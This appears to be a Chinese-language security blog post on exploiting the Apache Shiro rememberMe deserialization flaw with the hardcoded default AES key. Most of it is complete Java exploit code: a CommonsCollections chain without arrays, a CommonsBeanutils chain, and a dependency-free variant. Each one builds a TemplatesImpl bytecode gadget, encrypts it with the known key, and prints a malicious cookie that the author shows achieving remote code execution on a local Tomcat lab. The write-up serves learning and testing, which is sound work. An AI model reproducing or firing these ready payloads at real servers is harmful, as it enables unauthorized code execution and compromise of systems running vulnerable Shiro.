---
title: "shiro反序列化漏洞"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# shiro反序列化漏洞

shiro是一个通用的鉴权框架，而它有一个很经典的漏洞：shiro反序列化

简单讲讲漏洞原理：为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。

但是在Shiro 1.2.4版本之前内置了一个默认且固定的AES加密Key，而cookie的生成逻辑也很清晰：序列化字符串+AES 加密+base64 加密，所以攻击者可以按照这个逻辑伪造任意的rememberMe Cookie，进而触发反序列化漏洞

所以这里不分析原理了，来分析一下payload的构造

## TemplatesImpl在shiro中的利用

如果经过尝试的话，会发现CommonsCollections6是无法在shiro中利用的，这是因为如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误，而CC6中用到了transformer数组，所以无法利用，那么我们接下来就尝试用TemplatesImpl构造一个无数组的payload

在分析CC6前有一个newTransformer的方法如下：

~~~java
Transformer[] transformers = new Transformer[]{
  new ConstantTransformer(obj),
  new InvokerTransformer("newTransformer", null, null)
};
~~~

这里使用了数组，我们需要用其他方法替代掉

CC6中用到的TiedMapEntry类有一个getValue方法，这里调用了map的get方法，并传入key：

![QQ_1761730850260](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761730850260.png)

而这个get方法就是LazyMap的触发点：

![QQ_1761731007193](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761731007193.png)

我们注意到，这个 LazyMap#get 的参数key，会被传进transform()，也就是说我们可以尝试用它来替代ConstantTransformer()的作用，这样一来数组中只剩一个元素，那么自然就不需要数组了，接下来尝试构造payload

### 构造（CommonsCollectionsK1）

在CC6的基础上修改，同样使用javassist来生成命令执行弹出计算器的字节码，并且创建InvokerTransformer时先传入的无用方法getClass，等到序列化时再反射修改为newTransformer，关键代码如下：

~~~java
byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
TemplatesImpl tmpl = new TemplatesImpl();
setFieldValue(tmpl, "_bytecodes", new byte[][] {code});
setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

Transformer transformer = new InvokerTransformer("getClass", null, null);
Map innerMap = new HashMap();
innerMap.put("value", "Yuy0ung");
Map outerMap = LazyMap.decorate(innerMap, transformer);

TiedMapEntry tme = new TiedMapEntry(outerMap, tmpl);

Map evilMap = new HashMap();
evilMap.put(tme,"Yuy1ung");

outerMap.clear();

setFieldValue(transformer, "iMethodName", "newTransformer");
~~~

这里要注意的是最终的payload的加密和编码操作，为了避免出错可以直接使用shiro库中的加密和编码，最终payload如下：

~~~java
package com.yuy0ung;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.util.HashMap;
import java.util.Map;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class CommonsCollectionsShiro {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {

        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][] {code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("getClass", null, null);
        Map innerMap = new HashMap();
        innerMap.put("value", "Yuy0ung");
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, tmpl);

        Map evilMap = new HashMap();
        evilMap.put(tme,"Yuy1ung");

        outerMap.clear();

        setFieldValue(transformer, "iMethodName", "newTransformer");

        byte[] payload = serialize(evilMap);
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payload, key);
        System.out.printf("rememberMe=" + ciphertext.toString());
    }

    public static byte[] serialize(Map map) throws Exception {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(map);
        oos.close();

        return barr.toByteArray();
    }
}
~~~

运行后即可生成恶意rememberMe 字段：

![image-20251030104831092](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251030104831092.png)

在本地用tomcat启动一个shiro服务：

![image-20251030104933563](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251030104933563.png)

在shiro的登录口，登录并选择rememberme，会在cookie上获得一个rememberMe字段：

![image-20251030105652549](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251030105652549.png)

用生成的恶意rememberMe字段来替换掉并发送请求，即可成功触发命令执行，弹出计算器：

![QQ_1761793178544](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761793178544.png)

### 补充

另外的几点补充：

* Shiro不是遇到Tomcat就一定会有数组这个问题

* Shiro-550的修复并不意味着反序列化漏洞的修复，只是默认Key被移除了

## CB链在Shiro中的使用

面试时经常问到，shiro有key无链怎么打，这里就是说CC链打不了，应对策略无非就是打CB链（shiro自带CB依赖）或者JRMP（这个后面再研究）

接下来就看看shiro的CB怎么打

在前面CB链的学习中，我们已经发现CB有一个ComparableComparator是依赖于CC的，所以直接打CB肯定还是有问题的

我们先把shiro的cc依赖去除，然后打CCk1，果然失败了，说找不到CC依赖：
![QQ_1761879068004](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761879068004.png)

我们可以看见即使pom.xm没有引入CB，shiro依然自带CB依赖：
![QQ_1761879169586](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761879169586.png)

那么试试CB链：

poc如下：

~~~java
package com.yuy0ung;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.util.Map;
import java.util.PriorityQueue;
import java.util.Queue;

public class CommonsBeanutilsShiro {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][] {code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        BeanComparator bc = new BeanComparator();
        PriorityQueue pq = new PriorityQueue(2, bc);
        pq.add(1);
        pq.add(1);

        setFieldValue(bc, "property", "outputProperties");
        setFieldValue(pq, "queue",new Object[]{tmpl, tmpl});

        byte[] payload = serialize(pq);
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payload, key);
        System.out.printf("rememberMe=" + ciphertext.toString());
    }

    public static byte[] serialize(Queue queue) throws Exception {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }
}
~~~

发送生成的rememberMe字段后仍然报错，并且也是找不到CC依赖问题：

![](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761879797176.png)

这和我们在学习CB链时遇到的问题不谋而合，那么有没有办法找到一个无依赖的利用链呢

### 无依赖链构造

首先，我们明确目标，反序列化时shiro在寻找`org.apache.commons.collections.comparators.ComparableComparator`，所以我们需要找一个能替代它的类，先看看ComparableComparator在哪里被调用：

发现在BeanComparator中被引入：

![QQ_1761880201512](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761880201512.png)

并且在构造函数处，当没有显式传入 Comparator 的情况下，则默认使用ComparableComparator 

![QQ_1761880175628](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761880175628.png)

那我我们的目标就是找一个能替代的Comparator传进去，这个Comparator需要满足几点要求：

* 实现 java.util.Comparator 接口

* 实现 java.io.Serializable 接口

* Java、shiro或commons-beanutils自带，且兼容性强

我们可以找到一个CaseInsensitiveComparator：

![image-20251031112051164](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251031112051164.png)

这个类是 java.lang.String 类下的一个内部私有类，其实现了Comparator 和 Serializable ，且位于Java的核心代码中，兼容性强

我们可以通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator ：

~~~java
BeanComparator bc = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
~~~

最终的代码如下：

~~~java
package com.yuy0ung;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.util.Map;
import java.util.PriorityQueue;
import java.util.Queue;

public class CommonsBeanutilsShiro {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][] {code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        BeanComparator bc = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue pq = new PriorityQueue(2, bc);
        pq.add("test");
        pq.add("test");

        setFieldValue(bc, "property", "outputProperties");
        setFieldValue(pq, "queue",new Object[]{tmpl, tmpl});

        byte[] payload = serialize(pq);
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payload, key);
        System.out.printf("rememberMe=" + ciphertext.toString());
    }

    public static byte[] serialize(Queue queue) throws Exception {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();

    }
}
~~~

发送请求即可触发RCE：
![QQ_1761881204027](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761881204027.png)

至此我们完成了使用CB在无CC依赖时打反序列化RCE的利用链构造